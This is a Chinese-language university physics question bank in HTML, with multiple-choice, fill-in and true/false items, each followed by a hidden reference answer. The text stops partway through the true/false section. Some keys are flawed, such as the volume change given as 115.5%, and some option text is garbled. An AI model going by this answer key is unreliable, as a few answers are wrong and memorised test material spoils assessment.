        <content type="html"><![CDATA[<h3 id="选择题">选择题</h3><ol><li><p>一质点在平面上运动，已知质点位置矢量的表示法为$\vec{r}=at^2\vec{i}+bt^2\vec{j}$（其中a、b为常量），则该质点作（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p>A. 匀速直线运动</p><p>B. 变速直线运动</p><p>C. 抛物线运动</p><p>D. 一般曲线运动</p></li><li><p>质点做曲线运动，$\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over r}$标识位置矢量，$\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over v}$表示速度，$\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over a}$表示加速度，$S$表示路程，$a_t$​表示切向加速度，下列表达式中（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p>①$\frac{dv}{dt}=a$</p><p>②$\frac{dr}{dt}=v$</p><p>③$\frac{dS}{dt}=v$</p><p>④$\left | \frac{d\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over v}}{d\mathord{ \buildrel{ \lower0pt \hbox{$ \scriptscriptstyle \rightharpoonup$}} \over t}}  \right | =a_t$</p><p>A. 只有①、④正确</p><p>B. 只有②正确</p><p>C. 只有②、④正确</p><p>D. 只有③正确</p></li><li><p>质量为$20g$的子弹，以$400m/s$的速率沿图示方向射入一原来静止的质量为$980g$​的摆球中，摆线长度不可伸缩，子弹射入后开始与摆球一起运动的速率为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/503d269759ee3d6df4f631ab53166d224f4ade9a.jpg" alt="题图"></p><p>A. 2m/s</p><p>B. 4m/s</p><p>C. 7m/s</p><p>D. 8m/s</p></li><li><p>一质点在几个外力同时作用下运动时，下述哪种说法正确？</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div><p>A. 质点的动量改变时，质点的动能一定改变</p><p>B. 质点的动能不变时，质点的动量也一定不变</p><p>C. 外力的冲量是零，外力的功一定为零</p><p>D. 外力的功为零，外力的冲量一定为零</p></li><li><p>有两个力作用在一个有固定转轴的刚体上，在以下说法中（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p>①这两个力都平行于轴作用时，它们对轴的合力矩一定是零</p><p>②这两个力都垂直于轴作用时，它们对轴的合力矩可能是零</p><p>③当这两个力的合力为零时，它们对轴的合力矩也一定是零</p><p>④当这两个力对轴的合力矩为零时，它们的合力也一定是零</p><p>A. ①②③④都正确</p><p>B. ①②正确，③④错误</p><p>C. 只有①时正确的</p><p>D. ①②③都正确，④错误</p></li><li><p>一轻绳绕在有水平轴的定滑轮上，滑轮的转动惯量为l，绳下端挂一物体。物体所受重力为G，滑轮的角加速度为b，若将物体去掉而以与G相等的力直接向下拉绳子，滑轮的角加速度b将（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div><p>A. 不变</p><p>B. 变小</p><p>C. 变大</p><p>D. 无法判断</p></li><li><p>一人造地球卫星到地球中心$O$的最大距离和最小距离分别是$R_A$和$R_B$，设卫星对应的角动量分别是$L_A$、$L_B$，动能分别是$E_{KA}$、$E_{KB}$​，则应有（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p>A. $L_B&gt;L_A$，$E_{KA}&gt;E_{KB}$</p><p>B. $L_B&gt;L_A$，$E_{KA}=E_{KB}$</p><p>C. $L_B=L_A$，$E_{KA}=E_{KB}$</p><p>D. $L_B=L_A$，$E_{KA}&lt;E_{KB}$​</p></li><li><p>一圆盘正绕垂直于盘面的水平光滑固定轴$O$转动，如图射来两个质量相同，速度大小相同，方向相反并在一条直线上的子弹，子弹射入圆盘并且留在盘内，则子弹射入后的瞬间，圆盘的角速度$\omega$​将（）</p><p><img src="https://oss.iuoyt.com/img/posts/2e9f00daa6427d28e078913525f6b03e.png" alt="题图"></p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div><p>A. 增大</p><p>B. 不变</p><p>C. 减小</p><p>D. 不能确定</p></li><li><p>已知一定量的某种理想气体，在温度为$T_1$与$T_2$时分子最概然速率分别为$v_{p1}$和$v_{p2}$，分子速率分布函数的最大值分别为$f(v_{p1})$和$f(v_{p2})$若$T_1&gt;T_2$则（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p>A. $v_{p1}&gt;v_{p2},f(v_{p1})&gt;f(v_{p2})$​</p><p>B. $v_{p1}&gt;v_{p2},f(v_{p1})&lt;f(v_{p2})$​</p><p>C. $v_{p1}&lt;v_{p2},f(v_{p1})&gt;f(v_{p2})$</p><p>D. $v_{p1}&lt;v_{p2},f(v_{p1})&lt;f(v_{p2})$​</p></li><li><p>置于容器内的气体，如果气体内各处压强相等，或气体内各处温度相同，则这两种情况下气体的状态（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p>A. 一定都是平衡态</p><p>B. 不一定都是平衡态</p><p>C. 前者一定是平衡态，后者一定不是平衡态</p><p>D. 后者一定时平衡态，前者一定不是平衡态</p></li><li><p>如图所示，一定量理想气体从体积$V_1$，膨胀到体积$V_2$分别经历的过程是：$A\to B$等压过程，$A\to C$等温过程，$A\to D$​绝热过程，其中吸热量最多的过程是（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：A</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/14c01f1f8b1a632a3a08563ab7bd4798.png" alt="题图"></p><p>A. 是$A\to B$</p><p>B. 是$A\to C$</p><p>C. 是$A\to D$</p><p>D. 既是$A\to B$也是$A\to C$， 两过程吸热一样多</p></li><li><p>有两个相同的容器，容积固定不变，一个盛有氨气，另一个盛有氢气(看成刚性分子的理想气体)，它们的压强和温度都相等，现将$5J$​的热量传给氢气，使氢气温度升高，如果使氨气也升高同样的温度，则应向氨气传递热量是（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：A</p></div></div><p>A. $6J$</p><p>B. $5J$</p><p>C. $3J$</p><p>D. $2J$</p></li><li><p>关于可逆过程和不可逆过程的判断:</p><p>①可逆热力学过程一定是准静态过程.</p><p>②准静态过程一定是可逆过程.</p><p>③不可逆过程就是不能向相反方向进行的过程.</p><p>④凡有摩擦的过程,一定是不可逆过程.</p><p>以上四种判断，其中正确的是（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p>A. ①②③</p><p>B. ①②④</p><p>C. ②④</p><p>D. ①④</p></li><li><p>坐标原点放一正电荷$Q$，它在$P$点$(x=+1,y=0)$产生的电场强度为$E$。现在，另外有一个负电荷$-2Q$，试问应将它放在什么位置才能使$P$​点的电场强度等于零?（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p>A. x轴上，且x&gt;1</p><p>B. x轴上，且-1&lt;x&lt;0</p><p>C. y轴上，且y&gt;0</p><p>D. yy&lt;0轴上，且x&gt;1</p></li><li><p>电荷$Q$被曲面$S$所包围 ， 从无穷远处引入另一点电荷$q$至曲面外一点，如图所示，则引入前后（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/72bc933c9fdfeca8e0b21d6a55133962.png" alt="题图"></p><p>A. 曲面<em>S</em>的电场强度通量不变，曲面上各点场强不变</p><p>B. 曲面<em>S</em>的电场强度通量变化，曲面上各点场强不变</p><p>C. 曲面<em>S</em>的电场强度通量变化，曲面上各点场强变化</p><p>D. 曲面<em>S</em>的电场强度通量不变，曲面上各点场强变化</p></li><li><p>半径为$R$的“无限长”均匀带电圆柱体的静电场中各点的电场强度的大小$E$与距轴线的距离$r$的关系曲线为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p>A. <img src="https://oss.iuoyt.com/img/posts/6624119458402abcdd0c5395e51afc6c.png" alt="题图"></p><p>B. <img src="https://oss.iuoyt.com/img/posts/4e35ff5abc09dfcbf9ed8e4d28aeeb0f.png" alt="题图"></p><p>C. <img src="https://oss.iuoyt.com/img/posts/851a5d9c00e39fd3d959c5db88e37d8a.png" alt="题图"></p><p>D. <img src="https://oss.iuoyt.com/img/posts/103b340a50f8a37bbeb186c6fd54b337.png" alt="题图"></p></li><li><p>在点电荷$+q$的电场中，若取图中$P$点处为电势零点 ， 则$M$点的电势为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/950aa318927ff1bda52198e09832c895.png" alt="题图"></p><p>A. $\frac{q}{4\pi \epsilon_0a} $</p><p>B. $\frac{q}{8\pi \epsilon_0a} $</p><p>C. $\frac{-q}{4\pi \epsilon_0a} $</p><p>D. $\frac{-q}{8\pi \epsilon_0a} $</p></li><li><p>半径为$r$的均匀带电球面1，带有电荷$q$，其外有一同心的半径为$R$的均匀带电球面2，带有电荷$Q$，则此两球面之间的电势差$U_1-U_2$为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：A</p></div></div><p>A. $\frac{q}{4\pi\epsilon_0}(\frac{1}{r}-\frac{1}{R})$</p><p>B. $\frac{Q}{4\pi\epsilon_0}(\frac{1}{R}-\frac{1}{r})$</p><p>C. $\frac{1}{4\pi\epsilon_0}(\frac{q}{r}-\frac{Q}{R})$</p><p>D. $\frac{q}{4\pi\epsilon_0}$</p></li><li><p>一对等量异种电荷同时在同一点射入匀强磁场。已知正、负电荷的速度大小分别为$2v$和$v$，方向都和磁场$B$垂直，则（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div><p>A. 正电荷先返回到出发点</p><p>B. 负电荷先返回到出发点</p><p>C. 同时返回到出发点</p><p>D. 不知道</p></li><li><p>通有电流<em>I</em>的无限长直导线有如图三种形状，则$P,Q,O$各点磁感强度的大小$B_P，B_Q，B_O$间的关系为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/f010bab0cba00e81ff6d5ecbc5bf60cc.png" alt="题图"></p><p>A. $B_P&gt;B_Q&gt;B_O$</p><p>B. $B_Q&gt;B_P&gt;B_O$</p><p>C. $B_Q&gt;B_O&gt;B_P$</p><p>D. $B_O&gt;B_Q&gt;B_P$</p></li><li><p>如图两个半径为<em>R</em>的相同的金属环在$a、b$两点接触(<em>ab</em>连线为环直径)，并相互垂直放置。电流$I$沿$ab$连线方向由$a$端流入，$b$端流出，则环中心$O$点的磁感强度的大小为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：A</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/58e6341f316dfd977b1042652007c76a.png" alt="题图"></p><p>A. 0</p><p>B. $\frac{\mu_0I}{4R} $</p><p>C. $\frac{\mu_0I}{R} $</p><p>D. $\frac{\sqrt{2}\mu_0I}{R} $</p></li><li><p>如图所示，一矩形线圈以匀速自无场区平移进入均匀磁场区，又平移穿出。在(A)、(B)、©、(D)各$I-t$曲线中哪一种符合线圈中的电流随时间的变化关系（取逆时针指向为电流正方向，且不计线圈的自感）?（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/664504909a32680dc5a126b61f8e7474.png" alt="题图"></p><p><img src="https://oss.iuoyt.com/img/posts/217a332d3904ffe04ee36a51d79f8f72.png" alt="题图"><img src="https://oss.iuoyt.com/img/posts/365c866da16ecc11369efb86cfcbb3a2.png" alt="题图"><img src="https://oss.iuoyt.com/img/posts/c1c2f5bf18f9269f9ab0bff5c1b1fd4b.png" alt="题图"><img src="https://oss.iuoyt.com/img/posts/afdde1d2e6140cd6fbb7610d599fdce5.png" alt="题图"></p></li><li><p>轻质弹簧下挂一个小盘，小盘作简谐振动，平衡位置为原点，位移向下为正，并采用余弦表示。小盘处于最低位置时刻有一个小物体不变盘速地粘在盘上，设新的平衡位置相对原平衡位置向下移动的距离小于原振幅，且以小物体与盘相碰为计时零点，那么以新的平衡位置为原点时，新的位移表示式的初相在（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div><p>A. $0\sim \frac{p}{2}$之间</p><p>B. $\frac{p}{2}\sim p$之间</p><p>C. $p\sim \frac{3p}{2}$之间</p><p>D. $\frac{3p}{2}\sim 2p$之间</p></li><li><p>一质点沿x轴作简谐振动，振动方程为$x=4\times10^{-2}\cos(2\pi t+\frac{\pi}{3})$。从$t = 0$时刻起，到质点位置在$x=-2 cm$处，且向x轴正方向运动的最短时间间隔为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：A</p></div></div><p>A. $\frac{1}{2}s$</p><p>B. $\frac{1}{4}s$</p><p>C. $\frac{1}{6}s$</p><p>D. $\frac{1}{8}s$</p></li><li><p>图中所画的是两个简谐振动的振动曲线.若这两个简谐振动可叠加，则合成的余弦振动的初相为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/f8518150a0292bcf7e59f200ea72aabb-1717664091015-13.png" alt="题图"></p><p>A. $\frac{3}{2}\pi$</p><p>B. $\pi$</p><p>C. $\frac{1}{2}\pi$</p><p>D. 0</p></li><li><p>在下面几种说法中，正确的说法是（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div><p>A. 波源不动时，波源的振动周期与波动的周期在数值上是不同的.</p><p>B. 波源振动的速度与波速相同.</p><p>C. 在波传播方向上的任一质点振动相位总是比波源的相位滞后(按差值不大于p计).</p><p>D. 在波传播方向上的任一质点的振动相位总是比波源的相位超前.(按差值不大于p计)</p></li><li><p>图示一沿x轴正向传播的平面简谐波在$t=0$时刻的波形.若振动以余弦函数表示，且此题各点振动初相取$-p$到$p$之间的值，则（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div><p><img src="https://oss.iuoyt.com/img/posts/c6cb7b3f802005f0ee75b8aab8b0741d-1717664107815-22.png" alt="题图"></p><p>A. <em>O</em>点的初相为$\phi_0=-\frac{1}{2}\pi$</p><p>B. <em>1</em>点的初相为$\phi_1=0$</p><p>C. <em>2</em>点的初相为$\phi_2=0$</p><p>D. <em>3</em>点的初相为$\phi_3=0$</p></li></ol><h3 id="填空题">填空题</h3><ol><li><p>（习题1.1）质点x、y、z的分量形式分别为$x=R\cos\omega t,y=R\sin\omega t,z=\frac{h\omega}{2\pi}t$，其中R、h和均为大于零的常量</p><ul><li><p>则质点位矢的表达式为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$r=R\cos\omega ti+R\sin\omega tj+\frac{h\omega t}{2\pi}k$</p></div></div></li><li><p>任意时刻质点的速度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$v=-\omega R\sin\omega ti+R\omega\cos \omega tj+\frac{h\omega}{2\pi}k$</p></div></div></li><li><p>任意时刻质点的加速度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$a=-\omega^2R(\cos\omega ti+\sin \omega tj)$</p></div></div></li></ul></li><li><p>（习题1.2）已知质点的运动方程为$r=t^2i+(t-1)^2j$​（SI单位），则</p><ul><li><p>质点的运动轨迹（仅考虑t-1 s&gt;0的情况）为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\sqrt{y}=\sqrt{x}-1$</p></div></div></li><li><p>从t=1s到t=2s质点的位移为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\Delta r=3i+j$</p></div></div></li><li><p>t=2s时，质点的速度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$v_{2s}=4i+2j$</p></div></div></li><li><p>t=2s时，质点的加速度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$a_{2s}=2i+2j$</p></div></div></li></ul></li><li><p>（习题1.3）一质点做直线运动，其顺时加速度的变化规律为$a=-A\omega^2\cos \omega t$。已知$t=0$时，质点的速度和位移大小分别为$v_0=0$和$x=A$，其中$A$和$\omega$均为大于零的常量，则该质点的运动学方程为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$x=A\cos\omega t$</p></div></div></li><li><p>（习题1.9）一质量为$m$的质点在$Oxy$平面上运动，其位置矢量为$r=a\cos\omega ti+b\sin\omega tj$，其中$a,b,\omega$都是常量，则质点在任一时刻的加速度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$a=-a\omega^2\cos\omega ti-b\omega^2\sin\omega tj=-\omega^2r$</p></div></div></li><li><p>（习题2.1）一个半径为$R=1m$的飞轮以1500转每分钟的转速绕垂直盘面过圆心的定轴转动，受到制动后均匀减速，经$t=50s$后停止。则</p><ul><li><p>该飞轮的角加速度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$a=\frac{\omega-\omega_0}{t}=-\pi rad/s^2$</p></div></div></li><li><p>从制动开始到静止转过的圈数为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$N=\frac{\theta}{2\pi}=\frac{\omega_0t+\frac{1}{2}\alpha t^2}{2\pi}=625$</p></div></div></li><li><p>制动开始25s时，飞轮的角速度为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\omega_t=\omega_0+\alpha t=25\pi rad/s$</p></div></div></li></ul></li><li><p>（习题2.6）一根质量为$m$，长度为$l$的匀质细杆AB由一摩擦力可略去的铰链悬挂于某处，现欲使细杆恰好能从竖直位置转至水平位置，则需要给细杆的初角速度应该为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\omega_0=\sqrt{\frac{3g}{l}}$</p></div></div></li><li><p>（习题2.2）质量为$m$，长度为$l$的均匀细棒AB，其转轴到中心点$O$的距离为$\frac{l}{4}$并与棒垂直，该细棒对于该轴的转动惯量为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$I=\frac{7}{48}ml^2$</p></div></div></li><li><p>（P57）在跳水比赛中，运动员为了增加在空中的翻腾速度，他采取的方式是将身体收紧，其目的是（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：减小转动惯量</p></div></div></li><li><p>（习题3.1）一定质量的气体在压强保持不变的情况下，温度由$50℃$升高到$100℃$，此时体积改变量为原来体积的（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\frac{\delta V}{V_1}=\frac{373}{323}=115.5%$</p></div></div></li><li><p>（习题3.3）真空设备内部的压强为$1.013\times 10^{-10}$Pa，若系统温度为$300K$，则此时气体分子数密度为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$n=\frac{p}{kt}=\frac{1.013\times 10^{-10}}{1.38\times 10^{-23}\times 300}m^{-3}\approx 2.45\times10^{10}m^{-3}$</p></div></div></li><li><p>（习题4.1）一个打足气的自行车内胎，若在$7.0℃$时轮胎中空气的压强为$4.0\times 10^5$Pa，则在温度变为$37℃$时，轮胎中的空气压强为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$p_0=\frac{T_0}{T}p=\frac{310\times 4.0\times 10^5}{280}Pa\approx 4.43\times10^5Pa$</p></div></div></li><li><p>（习题4.3）气缸中贮有$2.0mol$的空气，温度为$27℃$，维持压强不变，而使空气的体积膨胀到原来的3倍，此时空气膨胀时所做的功为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$A=p(V_2-V_1)=2\nu RT_1=9.972\times10^3J$</p></div></div></li><li><p>（习题4.4）一定量的空气，吸收了$1.71\times 10^3J$的热量，并保持在$1.0\times 10^5Pa$下膨胀，体积从$1.0\times 10^{-2} m^3$增加到$1.5\times 10^{-2} m^3$，此时空气对外做功为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$A=\int pdV=p(V_2-V_1)=500J$</p></div></div></li><li><p>（思考8.2）将弹簧振子的弹簧截去一部分，其振动周期将（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：减小</p></div></div></li><li><p>（思考8.4）振幅为$A$的弹簧振子，当位移是振幅的一半时，它的动能占总能量的（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\frac{3}{4}$</p></div></div></li><li><p>（习题8.1）一质点按如下规律沿x轴做简谐振动（$x=0.05\cos[4\pi(t+\frac{1}{6})]$），则加速度的最大值约为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$a_{max}=A\omega^2\approx7.89m/s^2$</p></div></div></li><li><p>（习题8.2）设简谐振动的方程为$x=0.02\cos(100\pi t+\frac{\pi}{3})$，则t=1s时相位为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\frac{301}{3}\pi$</p></div></div></li><li><p>（习题8.8.3）质量$m=100g$的小球与弹簧构成的系统，按$x=0.05\cos(4\pi t+\frac{\pi}{3})$的规律做自由振动，则振动的能量是（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$E=\frac{1}{2}m\omega^2A^2=2\pi^2\times10^{-3}J$</p></div></div></li><li><p>（习题1.9）一质量为$m$的质点在$Oxy$平面上运动，其位置矢量为$r=a\cos\omega ti+b\sin\omega tj$，其中$a,b,\omega$都是常量，则质点所受的力对原点$O$的力矩为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$M=r\times F=r\times(-m\omega^2r)=-m\omega^2(r\times r)=0$</p></div></div></li><li><p>（习题5.1）在氢核（质子）与电子之间的最短距离为$5.3\times 10^{-11}m$，氢核与电子之间的静电力大小为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$F=\frac{1}{4\pi\varepsilon _0}\frac{q_1q_2}{r^2}=8.2\times 10^{-8}N$</p></div></div></li><li><p>（习题5.2）如图，真空中的三个点电荷，它们固定在边长为50cm的等边三角形的三个定点上，每个电荷的电荷量都是$2\times 10^{-6}C$​，每个电荷所受到的静电力大小均为​（）</p><p><img src="https://oss.iuoyt.com/img/posts/5599ecd6c68f38da29422892076e9b1c.png" alt="题图"></p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$F=2F_1\cos 30°=2\times \frac{1}{4\pi\varepsilon_0}\frac{q^2}{r^2}=0.25N$</p></div></div></li><li><p>（习题5.5）两个带等量异号电荷的无限大平行平面，电荷的面密度为$\sigma$，则它们之间的电场强度大小为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$E=\frac{\sigma}{2\varepsilon_0}+\frac{\sigma}{2\varepsilon_0}=\frac{\sigma}{\varepsilon_0}$</p></div></div></li><li><p>（习题5.10）一根长为L的细棒，被弯成半圆形，其上均匀带电，电荷线密度为$+\lambda$，则圆心处的电势为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$V=\int \mathrm{d}V=\int_{0}^{L} \frac{\lambda \mathrm{d}l}{4\pi\varepsilon_0R}=\frac{\lambda L}{4\pi\varepsilon_0R}=\frac{\lambda} {4\varepsilon_0}$</p></div></div></li><li><p>（习题5.13）半径为R的均匀带电球面至于真空中，其电荷面密度为$\sigma$​，则球面内的电场强度为（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：0</p></div></div></li><li><p>（思考6.1）在磁感强度为$B$的匀强磁场中，作一个半径为$r$的半球面$S$，$S$的边线所在的平面的法线方向单位矢量$e_n$与$B$之间的夹角为$\alpha$，则通过半球面$S$的磁通量为（）​</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：$\int\limits_{S}B\cdot\mathrm{d}S=\pi r^2B\cos \alpha $</p></div></div></li><li><p>当电子沿着（）方向射入匀强磁场中，它所受的磁场力最大</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：垂直</p></div></div></li><li><p>（思考6.4）若一电子以速度$v$射入磁感应强度为$B$​的匀强磁场中，当射入方向（）于磁场时，其不受磁场力的作用。</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：平行</p></div></div></li><li><p>（思考6.6）当载流线圈（）于磁力线时，磁力矩最大。</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：平行</p></div></div></li><li><p>（思考7.1）感应电动势的大小取决于（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：磁通量对时间的变化率</p></div></div></li><li><p>如图所示，当长直导线中的电流逐渐变大时，线圈中的感应电流方向是（）</p><p><img src="https://oss.iuoyt.com/img/posts/cfe4ee4bd5da5097d764d8e5c9ea8b64.png" alt="题图"></p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：逆时针</p></div></div></li><li><p>当导体线圈切割磁力线时，所产生的感应电动势是（）</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：动生电动势</p></div></div></li></ol><h3 id="判断题">判断题</h3><ol><li><p>（思考1.3.1）质点做圆周运动时，加速度一定垂直于速度方向，并指向圆心<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考1.3.2）加速度始终垂直于速度，则质点一定做圆周运动<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考1.3.3）质点在做匀速圆周运动过程中，加速度总是不变<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考1.3.4）只有切向加速度的运动一定是直线运动<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考1.4.1）物体运动方向总和和其所受合外力的方向相同<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考1.4.2）物体一旦受力就会产生加速度<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考1.4.3）物体运动的速率不变，则其所受合外力必然为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考2.1.1）内力矩不会改变刚体对某个定轴的角动量<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考2.1.2）作用力和反作用力对同一轴的力矩之和为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✔</p></div></div></p></li><li><p>（思考2.1.3）大小相同、方向相反的两个力对同一轴的力矩之和为零<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考2.2.1）作用在定轴转动刚体上的力越大，刚体转动的角加速度越大<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考2.1.4）质量相等、形状和大小不同的刚体，在相同力矩的作用下，它们的角加速度一定相等<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：✖</p></div></div></p></li><li><p>（思考2.2.2）作用在定轴转动刚体上的合力矩越大，刚体转动的角速度越大<div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div 